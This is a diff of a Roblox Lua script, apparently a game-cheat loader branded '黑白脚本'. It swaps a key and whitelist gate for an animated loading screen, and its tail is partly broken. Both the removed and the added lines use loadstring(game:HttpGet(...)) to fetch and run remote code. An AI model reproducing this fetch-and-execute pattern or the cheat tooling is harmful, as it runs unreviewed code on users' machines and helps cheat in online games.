@@ -1,390 +1,2242 @@
--- 黑白脚本风格 - 自定义通知UI
-local function CreateCustomNotify(Title, Text, Duration)
-    Duration = Duration or 3
-    local ScreenGui = Instance.new("ScreenGui")
-    ScreenGui.Name = "BlackWhiteNotify"
-    ScreenGui.Parent = game.Players.LocalPlayer.PlayerGui
-    
-    -- 通知背景（黑白脚本标志性深色）
-    local Background = Instance.new("Frame")
-    Background.Size = UDim2.new(0, 300, 0, 100)
-    Background.Position = UDim2.new(0.5, -150, 0.1, 0)
-    Background.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    Background.BackgroundTransparency = 0.2
-    Background.Parent = ScreenGui
-    
-    local Corner = Instance.new("UICorner")
-    Corner.CornerRadius = UDim.new(0, 15)
-    Corner.Parent = Background
-    
-    -- 标题（高亮文字）
-    local TitleLabel = Instance.new("TextLabel")
-    TitleLabel.Size = UDim2.new(1, 0, 0, 30)
-    TitleLabel.BackgroundTransparency = 1
-    TitleLabel.Text = Title
-    TitleLabel.TextColor3 = Color3.fromRGB(100, 180, 255) -- 黑白脚本高亮色
-    TitleLabel.TextSize = 18
-    TitleLabel.Font = Enum.Font.GothamBold
-    TitleLabel.Parent = Background
-    
-    -- 内容
-    local TextLabel = Instance.new("TextLabel")
-    TextLabel.Size = UDim2.new(1, 0, 1, -30)
-    TextLabel.Position = UDim2.new(0, 0, 0, 30)
-    TextLabel.BackgroundTransparency = 1
-    TextLabel.Text = Text
-    TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    TextLabel.TextSize = 14
-    TextLabel.Font = Enum.Font.Gotham
-    TextLabel.Parent = Background
-    
-    -- 自动销毁
-    task.delay(Duration, function()
-        ScreenGui:Destroy()
-    end)
-end
+local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))()
+local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()
 
--- 调用示例
-CreateCustomNotify("战争机器刷钱", "已收集1000金钱", 2.5)
-CreateCustomNotify("黑白脚本-卡密系统", "黑白脚本已启用卡密授权系统")
-
-
--- 分级授权卡密白名单系统（带指令管理）
+Notification:Notify(
+        {Title = "正在加载脚本", Description = "请耐心等待"},
+        {OutlineColor = Color3.fromRGB(0, 0, 0),Time = 20, Type = "image"},
+        {Image = "http://www.roblox.com/asset/?id=6023426923", ImageColor = Color3.fromRGB(258, 58, 68)})
 local Players = game:GetService("Players")
-local UserInputService = game:GetService("UserInputService")
-local HttpService = game:GetService("HttpService")
-local Chat = game:GetService("Chat")
-
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+local ContentProvider = game:GetService("ContentProvider")
 local player = Players.LocalPlayer
-local playerGui = player.PlayerGui
+local playerGui = player:WaitForChild("PlayerGui")
 
--- ==========================================
--- 配置区域
--- ==========================================
-local WHITELISTED_PLAYERS = {
-    "你的玩家名称",       -- 替换成你的Roblox用户名
-    "AdminUser",         -- 管理员账号
-    "TrustedFriend",     -- 其他信任的玩家
-    "wuckdfs"            -- 新增的白名单玩家
+local CONFIG = {
+    LOAD_TIME = 5,
+    PRIMARY_COLOR = Color3.fromRGB(100, 180, 255),
+    SECONDARY_COLOR = Color3.fromRGB(180, 100, 255),
+    GLOW_INTENSITY = 0.85,
+    LOGO_IMAGE = "rbxassetid://6954167216",
+    LOGO_TEXT = "作者：不知名相册",
+    BORDER_COLOR = Color3.fromRGB(255, 255, 255),
+    BORDER_THICKNESS = 2,
+    TEXT_BG_COLOR = Color3.fromRGB(30, 30, 50),
+    TEXT_BG_TRANSPARENCY = 0.7,
+    SHADOW_COLOR = Color3.fromRGB(0, 0, 50),
+    SHADOW_TRANSPARENCY = 0.7,
+    MAIN_BG_COLOR = Color3.fromRGB(15, 15, 25),
+    MAIN_BG_TRANSPARENCY = 0.15,
+    MAIN_BORDER_COLOR = Color3.fromRGB(200, 200, 255),
+    MAIN_BORDER_THICKNESS = 4,
+    GLOW_COLOR = Color3.fromRGB(100, 150, 255),
+    PULSE_SPEED = 3,
+    PARTICLE_COUNT = 20,
+    LOGO_SCALE = 0.8,
+    LOGO_PADDING = 0.05,
+    BG_PARTICLE_COUNT = 8
 }
 
-local VALID_KEY = "mc4er736pm"  -- 你的卡密
-local MAX_ATTEMPTS = 3          -- 最大尝试次数
-local ADMIN_PASSWORD = "your_admin_password"  -- 管理员密码，用于执行指令
+ContentProvider:PreloadAsync({
+    CONFIG.LOGO_IMAGE,
+    "rbxassetid://15613380753"
+})
 
--- ==========================================
--- 创建UI
--- ==========================================
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "AuthorizationSystem"
-ScreenGui.Parent = playerGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "WhiteBorderLoadingScreen"
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
--- 主窗口
-local MainFrame = Instance.new("Frame")
-MainFrame.Name = "MainFrame"
-MainFrame.Parent = ScreenGui
-MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-MainFrame.Position = UDim2.new(0.5, -140, 0.5, -120)
-MainFrame.Size = UDim2.new(0, 280, 0, 240)
-MainFrame.BackgroundTransparency = 0.1
-MainFrame.Visible = false
+local mainContainer = Instance.new("Frame")
+mainContainer.Name = "MainContainer"
+mainContainer.Size = UDim2.new(0.75, 0, 0.65, 0)
+mainContainer.Position = UDim2.new(0.125, 0, 0.175, 0)
+mainContainer.BackgroundTransparency = 1
+mainContainer.ZIndex = 10
+mainContainer.Parent = screenGui
 
--- 标题栏（用于拖拽）
-local TitleBar = Instance.new("Frame")
-TitleBar.Name = "TitleBar"
-TitleBar.Parent = MainFrame
-TitleBar.BackgroundColor3 = Color3.fromRGB(44, 62, 80)
-TitleBar.Size = UDim2.new(1, 0, 0, 40)
+local mainBackground = Instance.new("Frame")
+mainBackground.Name = "MainBackground"
+mainBackground.Size = UDim2.new(1, 0, 1, 0)
+mainBackground.BackgroundColor3 = CONFIG.MAIN_BG_COLOR
+mainBackground.BackgroundTransparency = 1
+mainBackground.ZIndex = 1
+mainBackground.Parent = mainContainer
 
-local TitleLabel = Instance.new("TextLabel")
-TitleLabel.Name = "TitleLabel"
-TitleLabel.Parent = TitleBar
-TitleLabel.BackgroundTransparency = 1
-TitleLabel.Size = UDim2.new(1, 0, 1, 0)
-TitleLabel.Text = "授权验证系统"
-TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-TitleLabel.TextSize = 18
-TitleLabel.Font = Enum.Font.SourceSansBold
+local mainBgCorner = Instance.new("UICorner")
+mainBgCorner.CornerRadius = UDim.new(0.05, 0)
+mainBgCorner.Parent = mainBackground
 
--- 关闭按钮
-local CloseButton = Instance.new("TextButton")
-CloseButton.Name = "CloseButton"
-CloseButton.Parent = TitleBar
-CloseButton.BackgroundColor3 = Color3.fromRGB(231, 76, 60)
-CloseButton.Position = UDim2.new(1, -35, 0, 5)
-CloseButton.Size = UDim2.new(0, 30, 0, 30)
-CloseButton.Text = "✕"
-CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-CloseButton.TextSize = 18
-CloseButton.Font = Enum.Font.SourceSansBold
+local mainBorder = Instance.new("Frame")
+mainBorder.Name = "MainBorder"
+mainBorder.Size = UDim2.new(1, 0, 1, 0)
+mainBorder.BackgroundTransparency = 1
+mainBorder.ZIndex = 2
+mainBorder.Parent = mainContainer
 
-CloseButton.MouseButton1Click:Connect(function()
-    MainFrame.Visible = false
-end)
+local mainBorderStroke = Instance.new("UIStroke")
+mainBorderStroke.Color = CONFIG.MAIN_BORDER_COLOR
+mainBorderStroke.Thickness = 0
+mainBorderStroke.Transparency = 0
+mainBorderStroke.Parent = mainBorder
 
--- 卡密输入框
-local InputBox = Instance.new("TextBox")
-InputBox.Name = "InputBox"
-InputBox.Parent = MainFrame
-InputBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-InputBox.Position = UDim2.new(0.05, 0, 0.25, 0)
-InputBox.Size = UDim2.new(0.9, 0, 0, 50)
-InputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-InputBox.PlaceholderText = "输入卡密以继续"
-InputBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
-InputBox.TextSize = 16
-InputBox.ClearTextOnFocus = false
-InputBox.Font = Enum.Font.SourceSans
+local mainBorderCorner = Instance.new("UICorner")
+mainBorderCorner.CornerRadius = UDim.new(0.05, 0)
+mainBorderCorner.Parent = mainBorder
 
--- 验证按钮
-local VerifyButton = Instance.new("TextButton")
-VerifyButton.Name = "VerifyButton"
-VerifyButton.Parent = MainFrame
-VerifyButton.BackgroundColor3 = Color3.fromRGB(46, 204, 113)
-VerifyButton.Position = UDim2.new(0.1, 0, 0.55, 0)
-VerifyButton.Size = UDim2.new(0.8, 0, 0, 50)
-VerifyButton.Text = "验证并进入"
-VerifyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-VerifyButton.TextSize = 16
-VerifyButton.Font = Enum.Font.SourceSansBold
+local mainBorderGlow = Instance.new("UIStroke")
+mainBorderGlow.Color = CONFIG.GLOW_COLOR
+mainBorderGlow.Thickness = 0
+mainBorderGlow.Transparency = 0.5
+mainBorderGlow.Parent = mainBorder
 
--- 状态提示
-local StatusLabel = Instance.new("TextLabel")
-StatusLabel.Name = "StatusLabel"
-StatusLabel.Parent = MainFrame
-StatusLabel.BackgroundTransparency = 1
-StatusLabel.Position = UDim2.new(0, 0, 0.85, 0)
-StatusLabel.Size = UDim2.new(1, 0, 0, 20)
-StatusLabel.Text = "请输入卡密"
-StatusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
-StatusLabel.TextSize = 14
-StatusLabel.Font = Enum.Font.SourceSans
+local innerGlowEffect = Instance.new("ImageLabel")
+innerGlowEffect.Name = "InnerGlowEffect"
+innerGlowEffect.Size = UDim2.new(1.05, 0, 1.05, 0)
+innerGlowEffect.Position = UDim2.new(0.5, 0, 0.5, 0)
+innerGlowEffect.AnchorPoint = Vector2.new(0.5, 0.5)
+innerGlowEffect.BackgroundTransparency = 1
+innerGlowEffect.Image = "rbxassetid://5028857084"
+innerGlowEffect.ImageColor3 = CONFIG.GLOW_COLOR
+innerGlowEffect.ScaleType = Enum.ScaleType.Slice
+innerGlowEffect.SliceCenter = Rect.new(100, 100, 100, 100)
+innerGlowEffect.ImageTransparency = 1
+innerGlowEffect.ZIndex = 0
+innerGlowEffect.Parent = mainBorder
 
--- ==========================================
--- 核心功能
--- ==========================================
-local errorCount = 0
+local particles = Instance.new("Frame")
+particles.Name = "Particles"
+particles.Size = UDim2.new(1, 0, 1, 0)
+particles.BackgroundTransparency = 1
+particles.ZIndex = 3
+particles.Parent = mainBorder
 
--- 本地存储功能
-local SavePath = "WindUI/AuthorizationData.json"
+local bgParticles = Instance.new("Frame")
+bgParticles.Name = "BackgroundParticles"
+bgParticles.Size = UDim2.new(1, 0, 1, 0)
+bgParticles.BackgroundTransparency = 1
+bgParticles.ZIndex = 0
+bgParticles.Parent = mainBackground
 
-local function SaveAuthorization(data)
-    pcall(function()
-        if not isfolder("WindUI") then
-            makefolder("WindUI")
+local leftPanel = Instance.new("Frame")
+leftPanel.Name = "LeftPanel"
+leftPanel.Size = UDim2.new(0.35, 0, 0.9, 0)
+leftPanel.Position = UDim2.new(0.05, 0, 0.05, 0)
+leftPanel.BackgroundTransparency = 1
+leftPanel.ZIndex = 11
+leftPanel.Parent = mainContainer
+
+local logoText = Instance.new("TextLabel")
+logoText.Name = "LogoText"
+logoText.Size = UDim2.new(1, 0, 0.15, 0)
+logoText.Position = UDim2.new(0.5, 0, 0, 0)
+logoText.AnchorPoint = Vector2.new(0.5, 0)
+logoText.BackgroundTransparency = 1
+logoText.Text = CONFIG.LOGO_TEXT
+logoText.TextColor3 = Color3.fromRGB(80, 0, 0)
+logoText.TextSize = 36
+logoText.Font = Enum.Font.GothamBlack
+logoText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+logoText.TextStrokeTransparency = 0.5
+logoText.TextTransparency = 1
+logoText.ZIndex = 12
+logoText.Parent = leftPanel
+
+local logoContainer = Instance.new("Frame")
+logoContainer.Name = "LogoContainer"
+logoContainer.Size = UDim2.new(0.9, 0, 0.7, 0)
+logoContainer.Position = UDim2.new(0.5, 0, 0.2, 0)
+logoContainer.AnchorPoint = Vector2.new(0.5, 0)
+logoContainer.BackgroundTransparency = 1
+logoContainer.ZIndex = 11
+logoContainer.Parent = leftPanel
+
+local logoImage = Instance.new("ImageLabel")
+logoImage.Name = "LogoImage"
+logoImage.Size = UDim2.new(1, 0, 1, 0)
+logoImage.Position = UDim2.new(0.5, 0, 0.5, 0)
+logoImage.AnchorPoint = Vector2.new(0.5, 0.5)
+logoImage.BackgroundTransparency = 1
+logoImage.Image = CONFIG.LOGO_IMAGE
+logoImage.ScaleType = Enum.ScaleType.Fit
+logoImage.ZIndex = 13
+logoImage.Parent = logoContainer
+
+local frameBorder = Instance.new("UIStroke")
+frameBorder.Color = CONFIG.BORDER_COLOR
+frameBorder.Thickness = CONFIG.BORDER_THICKNESS
+frameBorder.Transparency = 1
+frameBorder.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+frameBorder.Parent = logoImage
+
+local borderGlow = Instance.new("UIStroke")
+borderGlow.Color = CONFIG.PRIMARY_COLOR
+borderGlow.Thickness = CONFIG.BORDER_THICKNESS * 1.5
+borderGlow.Transparency = 1
+borderGlow.Parent = logoImage
+
+local innerGlow = Instance.new("ImageLabel")
+innerGlow.Name = "InnerGlow"
+innerGlow.Size = UDim2.new(1.1, 0, 1.1, 0)
+innerGlow.Position = UDim2.new(0.5, 0, 0.5, 0)
+innerGlow.AnchorPoint = Vector2.new(0.5, 0.5)
+innerGlow.BackgroundTransparency = 1
+innerGlow.Image = "rbxassetid://5028857084"
+innerGlow.ImageColor3 = CONFIG.PRIMARY_COLOR
+innerGlow.ScaleType = Enum.ScaleType.Slice
+innerGlow.SliceCenter = Rect.new(100, 100, 100, 100)
+innerGlow.ImageTransparency = 1
+innerGlow.ZIndex = 11
+innerGlow.Parent = logoContainer
+
+local rightPanel = Instance.new("Frame")
+rightPanel.Name = "RightPanel"
+rightPanel.Size = UDim2.new(0.6, 0, 0.9, 0)
+rightPanel.Position = UDim2.new(0.4, 0, 0.05, 0)
+rightPanel.BackgroundTransparency = 1
+rightPanel.ZIndex = 11
+rightPanel.Parent = mainContainer
+
+local welcomeText = Instance.new("TextLabel")
+welcomeText.Name = "WelcomeText"
+welcomeText.Size = UDim2.new(1, 0, 0.2, 0)
+welcomeText.Position = UDim2.new(0.5, 0, 0.1, 0)
+welcomeText.AnchorPoint = Vector2.new(0.5, 0.1)
+welcomeText.BackgroundTransparency = 1
+welcomeText.Text = "欢迎使用黑白脚本"
+welcomeText.TextColor3 = Color3.fromRGB(255, 255, 255)
+welcomeText.TextSize = 38
+welcomeText.Font = Enum.Font.GothamBlack
+welcomeText.TextXAlignment = Enum.TextXAlignment.Center
+welcomeText.TextTransparency = 1
+welcomeText.ZIndex = 12
+welcomeText.Parent = rightPanel
+
+local usernameText = Instance.new("TextLabel")
+usernameText.Name = "UsernameText"
+usernameText.Size = UDim2.new(1, 0, 0.15, 0)
+usernameText.Position = UDim2.new(0.5, 0, 0.35, 0)
+usernameText.AnchorPoint = Vector2.new(0.5, 0.35)
+usernameText.BackgroundTransparency = 1
+usernameText.Text = "玩家: " .. player.Name
+usernameText.TextColor3 = Color3.fromRGB(255, 255, 255)
+usernameText.TextSize = 28
+usernameText.Font = Enum.Font.GothamSemibold
+usernameText.TextXAlignment = Enum.TextXAlignment.Center
+usernameText.TextTransparency = 1
+usernameText.ZIndex = 12
+usernameText.Parent = rightPanel
+
+local loadingText = Instance.new("TextLabel")
+loadingText.Name = "LoadingText"
+loadingText.Size = UDim2.new(1, 0, 0.1, 0)
+loadingText.Position = UDim2.new(0.5, 0, 0.55, 0)
+loadingText.AnchorPoint = Vector2.new(0.5, 0.55)
+loadingText.BackgroundTransparency = 1
+loadingText.Text = "正在加载资源..."
+loadingText.TextColor3 = Color3.fromRGB(200, 200, 255)
+loadingText.TextSize = 24
+loadingText.Font = Enum.Font.Gotham
+loadingText.TextXAlignment = Enum.TextXAlignment.Center
+loadingText.TextTransparency = 1
+loadingText.ZIndex = 12
+loadingText.Parent = rightPanel
+
+local progressContainer = Instance.new("Frame")
+progressContainer.Name = "ProgressContainer"
+progressContainer.Size = UDim2.new(1, 0, 0.15, 0)
+progressContainer.Position = UDim2.new(0, 0, 0.75, 0)
+progressContainer.BackgroundTransparency = 1
+progressContainer.ZIndex = 11
+progressContainer.Parent = rightPanel
+
+local progressBackground = Instance.new("Frame")
+progressBackground.Name = "ProgressBackground"
+progressBackground.Size = UDim2.new(0.9, 0, 0.4, 0)
+progressBackground.Position = UDim2.new(0.5, 0, 0.3, 0)
+progressBackground.AnchorPoint = Vector2.new(0.5, 0.3)
+progressBackground.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
+progressBackground.BorderSizePixel = 0
+progressBackground.ZIndex = 12
+progressBackground.Parent = progressContainer
+
+local progressCorner = Instance.new("UICorner")
+progressCorner.CornerRadius = UDim.new(0.5, 0)
+progressCorner.Parent = progressBackground
+
+local progressBar = Instance.new("Frame")
+progressBar.Name = "ProgressBar"
+progressBar.Size = UDim2.new(0, 0, 1, 0)
+progressBar.BackgroundColor3 = CONFIG.PRIMARY_COLOR
+progressBar.BorderSizePixel = 0
+progressBar.ZIndex = 13
+progressBar.Parent = progressBackground
+
+local barCorner = Instance.new("UICorner")
+barCorner.CornerRadius = UDim.new(0.5, 0)
+barCorner.Parent = progressBar
+
+local gradient = Instance.new("UIGradient")
+gradient.Rotation = 90
+gradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, CONFIG.PRIMARY_COLOR),
+    ColorSequenceKeypoint.new(1, CONFIG.SECONDARY_COLOR)
+})
+gradient.Parent = progressBar
+
+local percentText = Instance.new("TextLabel")
+percentText.Name = "PercentText"
+percentText.Size = UDim2.new(0.9, 0, 0.4, 0)
+percentText.Position = UDim2.new(0.5, 0, 0.7, 0)
+percentText.AnchorPoint = Vector2.new(0.5, 0.7)
+percentText.BackgroundTransparency = 1
+percentText.Text = "0%"
+percentText.TextColor3 = Color3.fromRGB(255, 255, 255)
+percentText.TextSize = 22
+percentText.Font = Enum.Font.GothamSemibold
+percentText.TextXAlignment = Enum.TextXAlignment.Center
+percentText.TextTransparency = 1
+percentText.ZIndex = 12
+percentText.Parent = progressContainer
+
+local function createParticles()
+    for i = 1, CONFIG.PARTICLE_COUNT do
+        local particle = Instance.new("Frame")
+        particle.Name = "Particle_"..i
+        particle.Size = UDim2.new(0.01, 0, 0.01, 0)
+        particle.Position = UDim2.new(math.random(), 0, math.random(), 0)
+        particle.BackgroundColor3 = CONFIG.PRIMARY_COLOR
+        particle.BackgroundTransparency = 0.7
+        particle.ZIndex = 13
+        
+        local corner = Instance.new("UICorner")
+        corner.CornerRadius = UDim.new(0.5, 0)
+        corner.Parent = particle
+        
+        particle.Parent = particles
+    end
+end
+
+local function createBackgroundParticles()
+    for i = 1, CONFIG.BG_PARTICLE_COUNT do
+        local particle = Instance.new("Frame")
+        particle.Name = "BgParticle_"..i
+        particle.Size = UDim2.new(0.02, 0, 0.02, 0)
+        particle.Position = UDim2.new(math.random(), 0, math.random(), 0)
+        particle.BackgroundColor3 = CONFIG.SECONDARY_COLOR
+        particle.BackgroundTransparency = 0.9
+        particle.ZIndex = 0
+        
+        local corner = Instance.new("UICorner")
+        corner.CornerRadius = UDim.new(0.5, 0)
+        corner.Parent = particle
+        
+        particle.Parent = bgParticles
+        
+        coroutine.wrap(function()
+            local speed = 0.0002 + math.random() * 0.0001
+            while particle and particle.Parent do
+                particle.Position = particle.Position + UDim2.new(speed, 0, speed, 0)
+                if particle.Position.X.Scale > 1.2 then
+                    particle.Position = UDim2.new(-0.2, 0, math.random(), 0)
+                end
+                task.wait(0.1)
+            end
+        end)()
+    end
+end
+
+local function logoFloatAnimation()
+    local startPos = logoContainer.Position
+    local lastUpdate = tick()
+    
+    while logoContainer and logoContainer.Parent do
+        local now = tick()
+        if now - lastUpdate >= 0.016 then
+            local time = now
+            local offset = UDim2.new(0, 0, 0, math.sin(time * 2) * 5)
+            logoContainer.Position = startPos + offset
+            
+            local pulse = 0.7 + math.sin(time * 3) * 0.15
+            innerGlow.ImageTransparency = 1 - (pulse * CONFIG.GLOW_INTENSITY)
+            borderGlow.Transparency = 0.7 - (pulse * 0.2)
+            
+            lastUpdate = now
         end
-        writefile(SavePath, HttpService:JSONEncode(data))
-    end)
+        task.wait()
+    end
 end
 
-local function LoadAuthorization()
-    if not isfile(SavePath) then return nil end
+local function logoPulseAnimation()
+    local lastUpdate = tick()
+    while logoImage and logoImage.Parent do
+        local now = tick()
+        if now - lastUpdate >= 0.05 then
+            local time = now
+            local scale = 1 + math.sin(time * 0.5) * 0.03
+            logoImage.Size = UDim2.new(1 * scale, 0, 1 * scale, 0)
+            lastUpdate = now
+        end
+        task.wait()
+    end
+end
+
+local function borderPulseAnimation()
+    local lastUpdate = tick()
+    while mainBorder and mainBorder.Parent do
+        local now = tick()
+        if now - lastUpdate >= 0.016 then
+            local time = now
+            local pulse = 0.5 + math.sin(time * CONFIG.PULSE_SPEED) * 0.15
+            
+            mainBorderGlow.Thickness = CONFIG.MAIN_BORDER_THICKNESS * (2 + pulse * 0.5)
+            mainBorderGlow.Transparency = 0.5 - (pulse * 0.2)
+            innerGlowEffect.ImageTransparency = 0.8 - (pulse * 0.1)
+            
+            for _, particle in ipairs(particles:GetChildren()) do
+                if particle:IsA("Frame") then
+                    local particleNum = tonumber(string.match(particle.Name, "%d+"))
+                    local offsetX = math.sin(time + particleNum) * 0.01
+                    local offsetY = math.cos(time + particleNum) * 0.01
+                    particle.Position = particle.Position + UDim2.new(offsetX, 0, offsetY, 0)
+                    
+                    if particle.Position.X.Scale < 0 then
+                        particle.Position = UDim2.new(0, 0, particle.Position.Y.Scale, 0)
+                    elseif particle.Position.X.Scale > 1 then
+                        particle.Position = UDim2.new(1, 0, particle.Position.Y.Scale, 0)
+                    end
+                    
+                    if particle.Position.Y.Scale < 0 then
+                        particle.Position = UDim2.new(particle.Position.X.Scale, 0, 0, 0)
+                    elseif particle.Position.Y.Scale > 1 then
+                        particle.Position = UDim2.new(particle.Position.X.Scale, 0, 1, 0)
+                    end
+                end
+            end
+            
+            lastUpdate = now
+        end
+        task.wait()
+    end
+end
+
+local function elementsEntranceAnimation()
+    local tweenInfo = TweenInfo.new(
+        1.2, 
+        Enum.EasingStyle.Quint, 
+        Enum.EasingDirection.Out,
+        0,
+        false,
+        0.2
+    )
     
-    local success, data = pcall(function()
-        local content = readfile(SavePath)
-        return HttpService:JSONDecode(content)
-    end)
+    TweenService:Create(mainBackground, tweenInfo, {BackgroundTransparency = CONFIG.MAIN_BG_TRANSPARENCY}):Play()
+    TweenService:Create(mainBorderStroke, tweenInfo, {Thickness = CONFIG.MAIN_BORDER_THICKNESS}):Play()
+    TweenService:Create(mainBorderGlow, tweenInfo, {Thickness = CONFIG.MAIN_BORDER_THICKNESS * 2.5}):Play()
+    TweenService:Create(innerGlowEffect, tweenInfo, {ImageTransparency = 0.8}):Play()
     
-    return success and data or nil
+    TweenService:Create(frameBorder, tweenInfo, {Transparency = 0}):Play()
+    TweenService:Create(borderGlow, tweenInfo, {Transparency = 0.7}):Play()
+    
+    task.wait(0.3)
+    TweenService:Create(innerGlow, tweenInfo, {ImageTransparency = 0.8}):Play()
+    
+    task.wait(0.2)
+    local textTweenInfo = TweenInfo.new(0.8, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
+    TweenService:Create(logoText, textTweenInfo, {TextTransparency = 0}):Play()
+    task.wait(0.15)
+    TweenService:Create(welcomeText, textTweenInfo, {TextTransparency = 0}):Play()
+    task.wait(0.15)
+    TweenService:Create(usernameText, textTweenInfo, {TextTransparency = 0}):Play()
+    task.wait(0.1)
+    TweenService:Create(loadingText, textTweenInfo, {TextTransparency = 0}):Play()
+    TweenService:Create(percentText, textTweenInfo, {TextTransparency = 0}):Play()
 end
 
--- 执行远程脚本
-local function ExecuteRemoteScript()
-    pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/tfcygvunbind/Apple/83db676a23a57e5349610cf76abff2a32b7032aa/%E9%BB%91%E7%99%BD%E8%84%9A%E6%9C%AC%E6%9C%80%E6%96%B0%E6%BA%90%E7%A0%81"))()
-    end)
+local function rainbowTextAnimation()
+    local hue = 0
+    while usernameText and usernameText.Parent do
+        hue = (hue + 0.008) % 1
+        usernameText.TextColor3 = Color3.fromHSV(hue, 0.7, 1)
+        task.wait(0.08)
+    end
 end
 
--- 检查玩家是否在白名单中
-local function IsPlayerWhitelisted(playerName)
-    for _, name in ipairs(WHITELISTED_PLAYERS) do
-        if name:lower() == playerName:lower() then
-            return true
+local function loadingAnimation()
+    local startTime = tick()
+    local duration = CONFIG.LOAD_TIME
+    
+    createParticles()
+    createBackgroundParticles()
+    
+    local preloadTime = duration * 0.1
+    while tick() - startTime < preloadTime do
+        local progress = (tick() - startTime) / preloadTime * 0.1
+        progressBar.Size = UDim2.new(progress, 0, 1, 0)
+        percentText.Text = string.format("%d%%", math.floor(progress * 100))
+        task.wait()
+    end
+    
+    local mainLoadTime = duration * 0.8
+    local mainStartTime = tick()
+    while tick() - mainStartTime < mainLoadTime do
+        local progress = 0.1 + (tick() - mainStartTime) / mainLoadTime * 0.8
+        progressBar.Size = UDim2.new(progress, 0, 1, 0)
+        percentText.Text = string.format("%d%%", math.floor(progress * 100))
+        
+        local dots = string.rep(".", math.floor(tick() % 4))
+        loadingText.Text = "正在加载资源" .. dots
+        
+        local hue = 0.5 + progress * 0.3
+        gradient.Color = ColorSequence.new({
+            ColorSequenceKeypoint.new(0, Color3.fromHSV(hue, 0.8, 1)),
+            ColorSequenceKeypoint.new(1, Color3.fromHSV(hue + 0.1, 0.8, 1))
+        })
+        
+        task.wait()
+    end
+    
+    local finishTime = duration * 0.1
+    local finishStartTime = tick()
+    while tick() - finishStartTime < finishTime do
+        local progress = 0.9 + (tick() - finishStartTime) / finishTime * 0.1
+        progressBar.Size = UDim2.new(progress, 0, 1, 0)
+        percentText.Text = string.format("%d%%", math.floor(progress * 100))
+        task.wait()
+    end
+    
+    loadingText.Text = "加载完成!"
+    percentText.Text = "100%"
+    
+    for i = 1, 2 do
+        TweenService:Create(progressBar, TweenInfo.new(0.15), {Size = UDim2.new(1.02, 0, 1.1, 0)}):Play()
+        task.wait(0.15)
+        TweenService:Create(progressBar, TweenInfo.new(0.15), {Size = UDim2.new(1, 0, 1, 0)}):Play()
+        task.wait(0.15)
+    end
+    
+    local flash = Instance.new("Frame")
+    flash.Size = UDim2.new(1, 0, 1, 0)
+    flash.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    flash.BackgroundTransparency = 1
+    flash.ZIndex = 20
+    flash.Parent = mainContainer
+    
+    TweenService:Create(flash, TweenInfo.new(0.3), {BackgroundTransparency = 0.6}):Play()
+    task.wait(0.3)
+    TweenService:Create(flash, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
+    
+    local fadeOutInfo = TweenInfo.new(0.8, Enum.EasingStyle.Quint, Enum.EasingDirection.In)
+    
+    for _, text in ipairs({logoText, welcomeText, usernameText, loadingText, percentText}) do
+        TweenService:Create(text, fadeOutInfo, {TextTransparency = 1}):Play()
+    end
+    
+    TweenService:Create(frameBorder, fadeOutInfo, {Transparency = 1}):Play()
+    TweenService:Create(borderGlow, fadeOutInfo, {Transparency = 1}):Play()
+    TweenService:Create(innerGlow, fadeOutInfo, {ImageTransparency = 1}):Play()
+    
+    TweenService:Create(mainBackground, fadeOutInfo, {BackgroundTransparency = 1}):Play()
+    TweenService:Create(mainBorderStroke, fadeOutInfo, {Thickness = 0}):Play()
+    TweenService:Create(mainBorderGlow, fadeOutInfo, {Thickness = 0}):Play()
+    TweenService:Create(innerGlowEffect, fadeOutInfo, {ImageTransparency = 1}):Play()
+    
+    for _, particle in ipairs(particles:GetChildren()) do
+        if particle:IsA("Frame") then
+            TweenService:Create(particle, fadeOutInfo, {BackgroundTransparency = 1}):Play()
         end
     end
-    return false
-end
-
--- 验证卡密
-local function VerifyKey(inputKey)
-    return inputKey == VALID_KEY
-end
-
--- 验证按钮点击事件
-VerifyButton.MouseButton1Click:Connect(function()
-    local enteredCode = InputBox.Text
     
-    if errorCount >= MAX_ATTEMPTS then
-        StatusLabel.Text = "尝试次数已达上限！"
-        StatusLabel.TextColor3 = Color3.fromRGB(231, 76, 60)
-        return
+    task.wait(0.8)
+    screenGui:Destroy()
+end
+
+screenGui.Parent = playerGui
+
+coroutine.wrap(logoFloatAnimation)()
+coroutine.wrap(logoPulseAnimation)()
+coroutine.wrap(borderPulseAnimation)()
+coroutine.wrap(elementsEntranceAnimation)()
+coroutine.wrap(rainbowTextAnimation)()
+coroutine.wrap(loadingAnimation)()
+local LBLG = Instance.new("ScreenGui", getParent)
+local LBL = Instance.new("TextLabel", getParent)
+local player = game.Players.LocalPlayer
+
+-- 1. 创建 UI 容器与文本标签
+local LBLG = Instance.new("ScreenGui")
+LBLG.Name = "LBLG"
+LBLG.Parent = game.CoreGui
+LBLG.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+LBLG.Enabled = true
+
+local LBL = Instance.new("TextLabel")
+LBL.Name = "LBL"
+LBL.Parent = LBLG
+LBL.BackgroundColor3 = Color3.new(1, 1, 1)
+LBL.BackgroundTransparency = 1
+LBL.BorderColor3 = Color3.new(0, 0, 0)
